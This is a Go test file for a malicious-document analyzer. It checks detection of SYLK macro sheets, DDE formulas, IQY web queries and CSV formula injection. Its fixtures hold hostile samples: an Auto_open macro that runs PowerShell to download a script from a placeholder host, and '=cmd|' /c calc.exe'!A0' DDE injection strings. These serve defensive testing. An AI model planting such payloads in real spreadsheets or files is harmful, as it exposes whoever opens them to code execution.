package maldoctrace

import (
	"context"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/extractor"
)

func TestSYLKMacroSheet(t *testing.T) {
	slk := strings.Join([]string{
		"ID;P",
		"O;E",
		"NN;NAuto_open;ER1C1",
		`C;X1;Y1;K0;EEXEC("cmd.exe /c powershell -c iwr http://example.invalid/p.ps1")`,
		"C;Y2;K0;EHALT()",
		"E",
	}, "\r\n")
	r := AnalyzeFromBytes(context.Background(), []byte(slk), "a.slk", Options{})
	if r.Format != "sylk" || r.Macros != "present" || len(r.MacroSheets) != 1 {
		t.Fatalf("format %s macros %s sheets %+v diags %+v", r.Format, r.Macros, r.MacroSheets, r.Diagnostics)
	}
	if !hasFindingSev(r, "xlm_auto_open", "high") || len(r.Commands) == 0 || !strings.Contains(r.Commands[0].CommandLine, "powershell") {
		t.Fatalf("findings %+v commands %+v", r.StaticFindings, r.Commands)
	}
	if r.Verdict != "malicious" || !hasIOCType(r, "url", "http://example.invalid/p.ps1") {
		t.Fatalf("verdict %s iocs %+v", r.Verdict, r.Indicators)
	}
}

func TestSYLKDDE(t *testing.T) {
	slk := "ID;P\r\nC;Y1;X1;K0;E=cmd|' /c calc.exe'!A0\r\nE\r\n"
	r := AnalyzeFromBytes(context.Background(), []byte(slk), "b.slk", Options{})
	if r.Format != "sylk" || !hasFindingSev(r, "dde", "high") || r.Verdict != "malicious" {
		t.Fatalf("format %s findings %+v verdict %s", r.Format, r.StaticFindings, r.Verdict)
	}
}

func TestIQY(t *testing.T) {
	r := AnalyzeFromBytes(context.Background(), []byte("WEB\r\n1\r\nhttp://example.invalid/q.php?id=1\r\n"), "a.iqy", Options{})
	if r.Format != "iqy" || !hasFindingSev(r, "external_web_query", "high") || !hasIOCType(r, "url", "http://example.invalid/q.php?id=1") || r.Verdict != "malicious" {
		t.Fatalf("format %s findings %+v iocs %+v", r.Format, r.StaticFindings, r.Indicators)
	}
}

func TestCSVDDE(t *testing.T) {
	csv := "name,amount\r\nalice,10\r\n=cmd|' /c calc.exe'!A0,20\r\n"
	r := AnalyzeFromBytes(context.Background(), []byte(csv), "a.csv", Options{})
	if r.Format != "csv" || !hasFindingSev(r, "dde", "high") {
		t.Fatalf("format %s findings %+v", r.Format, r.StaticFindings)
	}
	// Plain VBA text is still VBA.
	if extractor.Detect([]byte("Sub X()\r\nEnd Sub\r\n")) != extractor.FormatVBA {
		t.Fatal("VBA text misdetected")
	}
}

func FuzzTextSheets(f *testing.F) {
	f.Add([]byte("ID;P\r\nO;E\r\nNN;NAuto_open;ER1C1\r\nC;X1;Y1;EHALT()\r\nE"))
	f.Add([]byte("WEB\n1\nhttp://example.invalid/\n"))
	f.Add([]byte("a,=cmd|' /c x'!A0\n"))
	f.Fuzz(func(t *testing.T, b []byte) {
		extractor.Extract(context.Background(), b, nil)
	})
}
